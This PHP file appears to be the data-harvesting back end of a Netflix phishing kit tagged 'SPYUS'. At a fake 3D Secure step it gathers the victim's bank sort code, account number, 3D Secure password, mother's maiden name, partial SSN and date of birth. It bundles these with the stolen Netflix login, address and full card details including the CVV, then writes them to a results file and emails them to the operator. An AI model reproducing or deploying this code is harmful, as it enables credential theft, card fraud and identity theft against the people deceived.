<?php

error_reporting(0);

session_start();

include('../__CONFIG__.php');
include './functions.php';

#Security information
@$_SESSION['osid'] = @$_POST['osid'];
@$_SESSION['creditlimit'] = @$_POST['creditlimit'];
@$_SESSION['mothernam'] = @$_POST['mothernam'];
@$_SESSION['sortcode'] = @$_POST['sortcode'];
@$_SESSION['accountnum'] = @$_POST['accountnum'];
@$_SESSION['secure'] = @$_POST['password_vbv'];
@$_SESSION['dob_month'] = @$_POST['dob_month'];
@$_SESSION['dob_day'] = @$_POST['dob_day'];
@$_SESSION['dob_year'] = @$_POST['dob_year'];
@$_SESSION['ssn'] = @$_POST['ssn'];
#SEND RESULT ! /* Don't Touche :) */



if (isset($_POST['confirm']))
{



	$subject  = "NETFLIX [ LOGIN - VBV ] - ".$_SERVER['REMOTE_ADDR']."";
	$headers  = "From: SPYUS <rezlt@SPYUS.ORG>\r\n";
	$headers .= "MIME-Version: 1.0\r\n";
	$headers .= "Content-Type: text/html; charset=UTF-8\r\n";

	$message = "
	<!DOCTYPE html>
	<html>
	<head>
		<meta charset='UTF-8' />
	</head>
	<body>
	<style type='text/css'>
	body{
		background: #141414;
		color: #fff;
		font-family: arial;
	}
	.rezlt{
		width: 600px;
	}
	table{
		width: 100%;
	    background: #fff;
	    color: #000;
	}
	table td{
		padding: 10px;
	}
	.newline{
	    width: 100%;
	    background: #141414;
	    height: 2px;
	}
	</style>
	<center>
	<div class='rezlt'>
		<h3 style='text-align: center;background: #e50914;margin: 0px;padding: 17px;'>Netflix</h3>
		<table>
			<tr>
				<td style='width: 200px;'><b>Login Email</b></td>
				<td style='width: 400px;'>".$_SESSION['EM']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Login Password</b></td>
				<td style='width: 400px;'>".$_SESSION['PW']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>First Name</b></td>
				<td style='width: 400px;'>".$_SESSION['sfirstName']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Last Name</b></td>
				<td style='width: 400px;'>".$_SESSION['slastname']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Address</b></td>
				<td style='width: 400px;'>".$_SESSION['saddress']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>City</b></td>
				<td style='width: 400px;'>".$_SESSION['scity']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>State</b></td>
				<td style='width: 400px;'>".$_SESSION['sstate']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Zip Code</b></td>
				<td style='width: 400px;'>".$_SESSION['szip']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>Card Number</b></td>
				<td style='width: 400px;'>".$_SESSION['scnxxx']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Experation Date</b></td>
				<td style='width: 400px;'>".$_SESSION['seppp_MM']."/".$_SESSION['seppp_YY']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>CVV/CSC</b></td>
				<td style='width: 400px;'>".$_SESSION['sCXXVX']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>Sort Code</b></td>
				<td style='width: 400px;'>".@$_POST['sortcode']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>3D Secure</b></td>
				<td style='width: 400px;'>".@$_POST['password_vbv']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Account Number</b></td>
				<td style='width: 400px;'>".@$_POST['accountnum']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>OS ID</b></td>
				<td style='width: 400px;'>".@$_POST['osid']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Credit Limit</b></td>
				<td style='width: 400px;'>".@$_POST['creditlimit']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Mother Name</b></td>
				<td style='width: 400px;'>".@$_POST['mothernam']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Last 4 Ssn</b></td>
				<td style='width: 400px;'>".@$_POST['ssn']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Date OF Birth</b></td>
				<td style='width: 400px;'>".@$_POST['dob_day']."-".@$_POST['dob_month']."-".@$_POST['dob_year']."</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>IP</b></td>
				<td style='width: 400px;'><a href='http://geoiptool.com/?ip=".$_SERVER['REMOTE_ADDR']."' target='_blank'>".$_SERVER['REMOTE_ADDR']."</a></td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>User Agent</b></td>
				<td style='width: 400px;'>".$_SERVER['HTTP_USER_AGENT']."</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Accept Language</b></td>
				<td style='width: 400px;'>".$_SERVER['HTTP_ACCEPT_LANGUAGE']."</td>
			</tr>
		</table>
	</div>
	</center>
	</body>
	</html>
	";
	$Txt_Rezlt = fopen('../../rezlt.html', 'a+');
	fwrite($Txt_Rezlt, $message);
	fclose($Txt_Rezlt);
	mail($to, $subject, $message, $headers);

	header('Location: ../congratulations.php?accountnum_setopt='.sha1(time()));

}